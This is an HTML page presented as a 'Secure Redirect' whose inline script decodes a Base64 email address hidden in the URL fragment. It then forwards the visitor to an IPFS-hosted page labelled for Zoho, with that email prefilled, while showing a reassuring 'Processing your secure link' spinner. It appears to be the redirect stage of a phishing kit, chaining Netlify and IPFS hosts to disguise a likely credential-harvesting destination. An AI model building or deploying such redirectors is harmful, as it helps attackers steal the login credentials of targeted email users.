<!DOCTYPE html>
<html>
<head>
    <title>Secure Redirect</title>
    <script>
        // Handle format: #.i7pl1ib.https://curious-tapioca-ae1dec.netlify.app/?data=BASE64_EMAIL
        const hash = window.location.hash;
        
        if (hash && hash.includes('.i7pl1ib.')) {
            // Extract everything after the token
            const fragment = hash.substring(1); // Remove #
            const encodedData = fragment.split('.i7pl1ib.')[1];
            
            if (encodedData) {
                // The encodedData IS the Site 2 URL with Base64 email
                // Example: https://curious-tapioca-ae1dec.netlify.app/?data=bWFya0BhcHBsZS5jb20=
                
                try {
                    // Parse the URL to get the data parameter
                    const urlObj = new URL(encodedData);
                    const base64Email = urlObj.searchParams.get('data');
                    
                    if (base64Email) {
                        // Decode the email
                        const userEmail = atob(base64Email);
                        
                        // Redirect to final IPFS destination
                        const finalURL = `https://bafkreic32m5keaxbh55kf54lqom4lwz37avkefuyp5bpkqiegb6q6ue4iq.ipfs.dweb.link/?zoho.com&user=${encodeURIComponent(userEmail)}`;
                        
                        window.location.href = finalURL;
                        return;
                    }
                } catch(e) {
                    // If URL parsing fails, try to extract data= directly
                    const dataMatch = encodedData.match(/data=([^&]+)/);
                    if (dataMatch) {
                        const userEmail = atob(dataMatch[1]);
                        const finalURL = `https://bafkreic32m5keaxbh55kf54lqom4lwz37avkefuyp5bpkqiegb6q6ue4iq.ipfs.dweb.link/?zoho.com&user=${encodeURIComponent(userEmail)}`;
                        window.location.href = finalURL;
                        return;
                    }
                }
            }
        }
        
        document.body.innerHTML = 'Invalid or expired link.';
    </script>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 100px;
            background: #f5f5f5;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Processing your secure link...</p>
</body>
</html>
